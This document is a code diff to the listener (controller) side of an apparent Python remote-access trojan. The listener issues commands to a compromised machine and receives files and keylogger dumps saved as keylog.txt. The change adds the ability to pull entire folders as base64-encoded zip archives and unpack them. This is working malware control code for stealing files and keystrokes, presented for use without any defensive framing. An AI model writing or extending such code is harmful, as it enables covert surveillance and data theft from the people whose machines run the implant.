@@ -1,7 +1,8 @@
 import socket
 import json
 import base64
-
+import zipfile
+import os
 
 class Listener:
 
@@ -35,11 +36,21 @@ class Listener:
 
     def download_file(self, data, path):
         try:
-            with open(path, "wb") as file:
-                file.write(base64.b64decode(data))
-            return "[+] File downloaded successfully!"
+            if data.startswith("FOLDER:"):
+                folder_name, content = data[7:].split(":", 1)
+                zip_path = f"{folder_name}.zip"
+                with open(zip_path, "wb") as file:
+                    file.write(base64.b64decode(content))
+                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+                    zip_ref.extractall(folder_name)
+                os.remove(zip_path)
+                return f"[+] Folder '{folder_name}' downloaded and extracted successfully!"
+            else:
+                with open(path, "wb") as file:
+                    file.write(base64.b64decode(data))
+                return "[+] File downloaded successfully!"
         except Exception as e:
-            return f"[-] Error during file download: {str(e)}"
+            return f"[-] Error during file/folder download: {str(e)}"
 
     def upload_file(self, path):
         try:
@@ -66,15 +77,15 @@ class Listener:
             result = self.receive()
 
             if command[0] == "get" or command[0] == "keyscan_dump":
-                if result.startswith("[-]"):  # Check if it's an error message
-                    print(result)  # Print the error message
+                if result.startswith("[-]"): 
+                    print(result) 
                 else:
                     try:
                         file_name = "keylog.txt" if command[0] == "keyscan_dump" else command[1]
                         download_result = self.download_file(result, file_name)
-                        print(download_result)  # Print the success message
+                        print(download_result) 
                     except Exception as e:
-                        print(f"[-] Error during file download: {str(e)}")
+                        print(f"[-] Error during file/folder download: {str(e)}")
             else:
                 print(result)
 
